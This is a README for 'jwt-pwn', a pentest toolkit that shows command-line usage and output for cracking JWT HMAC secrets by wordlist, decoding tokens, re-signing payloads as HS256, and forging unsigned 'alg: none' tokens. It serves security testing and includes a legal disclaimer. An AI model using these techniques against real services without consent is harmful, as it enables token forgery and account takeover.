jwt-pwn
=========

## Security Testing Scripts for JWT

---

## jwt-cracker.py

JWT password/secret cracker.

```
$python3 jwt-cracker.py -jwt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4" -t 10 -w /pentest/wordlist.txt
[info] Loaded wordlist.
[info] starting brute-forcing.
[#] KEY FOUND: 1234
```

---


## jwt-cracker-go

JWT password/secret cracker that is much faster.

```
$ ./jwt-cracker-go -wordlist /pentest/wordlist.txt -token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4"
[+] Key Found: 1234
```

---

## jwt-decoder.py

Decodes the value of JWT.

```
$ python3 jwt-decoder.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1
YqLEv9ypAApz27nfYP5L4"


[#] JWT Header:
{"alg": "HS256", "typ": "JWT"}

[#] JWT Value:
{"jwt": "pwn"}
```

---

## jwt-any-to-hs256.py

Generates a new JWT that is signed with HS256 with the same payload value of a provided JWT.

```
python3 jwt-any-to-hs256.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc
8D-J1YqLEv9ypAApz27nfYP5L4"


[#] Generated JWT:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3QiOiJwd24ifQ.WqY6R5zmscIx_6ZFwSASHZ_1zbqih_IdtLv_S2Pj028
```

---

## jwt-mimicker.py

Generates a new unsigned JWT with the same payload value of a provided JWT.

```
python3 jwt-mimicker.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J
1YqLEv9ypAApz27nfYP5L4"


[#] Generated unsigned JWT:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJqd3QiOiJwd24ifQ.
```

---

# **Requirements** #
* Python2 or Python3
* pyjwt


# **Legal Disclaimer** #
This project is made for educational and ethical testing purposes only. Usage of jwt-pwn for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


# **License** #
The project is licensed under MIT License.


# **Author** #
*Mazin Ahmed*
* Website: [https://mazinahmed.net](https://mazinahmed.net)
* Email: *mazin AT mazinahmed DOT net*
* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
